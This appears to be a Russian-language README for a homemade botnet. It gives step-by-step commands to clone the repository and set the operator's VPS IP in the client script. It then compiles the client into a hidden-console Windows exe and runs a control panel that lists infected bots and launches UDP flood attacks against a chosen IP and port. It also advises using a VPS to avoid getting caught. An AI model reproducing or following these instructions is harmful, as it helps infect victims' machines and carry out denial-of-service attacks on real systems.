<h1 align="center">Подпишись на мой телеграмм <a href="https://t.me/samurai_figure" target="_blank">N∆RI</a> 
<img src="https://github.com/blackcater/blackcater/raw/main/images/Hi.gif" height="32"/></h1>
<h3 align="center">Простой бот-нет своими руками ot N∆RI</h3>
Можно также использовать как панель для VPS ботнета <br>
Клонируем гит <br>
 
```shell
git clone https://github.com/Samuraianonweb/bot
```
<br>
 
```shell
cd bot
```
<br>
Чтобы не попасться , лучше использовать VPS<br>

Чтобы узнать свой(VPS) ip 
 
​```shell
$ ifconfig <br>
```
Редактируем файл smss.py

<br>
run=False
	def __init__(self, connect:Tuple[str,int]=("вставляем свой ip",9999)) -> None:
<br>

Когда всё подготовленно , осталось зделать с Python  в EXe файл<br>

Установка pyinstaller<br>
 
```shell
pip install pyinstaller
```

После полной установки в нашем директории bot <br>
Приступаем к билду exe <br>
 
```shell
pyinstaller --onefile --noconsole smss.py<br>
```
<br>
Флаг --onefile собирает всё в один файл<br>
Флаг --noconsole делает так чтобы при запуске скрывалась консоль <br>
После того как наш файл exe создался можно начать с панели <br>

Запуск панели 
 
```shell
python Server.py
```
Вводим help и видем всё настройки 
update - Для обновления листа ботов 
list - Показать активных ботов 
Команда атаки<br>
 
```shell
attack udp <ip> <port> <time in second> <thread>
```
